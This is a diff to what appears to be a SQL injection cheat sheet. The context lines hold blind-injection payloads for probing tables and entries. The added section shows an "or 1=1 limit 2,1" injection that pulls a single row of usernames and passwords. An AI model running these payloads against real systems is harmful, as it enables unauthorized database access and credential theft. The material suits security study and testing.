@@ -159,7 +159,7 @@ xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE u
 HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --'
 HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users WHERE ROWNUM=1)='x' --'   //oracle
 ```
-> This returns an 'x' for every row in the table. we limit to 1 to check for only 1 x returned. If there is no x returned, then there is no table, or there are no rows in that table.
+> This returns an 'x' for every row in the table. we limit to 1 to check for only 1 x returned. If there is no x returned, then there is no table, or there are no rows in that table. 
 
 * Check for the presence of an entry:
 ```SQL
@@ -432,6 +432,12 @@ SELECT username password FROM users
 ```
 
 > To make SQL case sensitive, use the `BINARY` keyword.
+
+The `LIMIT` statement can be used to return not only a certain number of rows, but also a specific row. This can be done by placing an index:
+```SQL
+select username,pass from users where username='x' or 1=1 limit 2,1;
+```
+- This returns the third element only. (2nd index is the third element in the array).
 
 ---
 
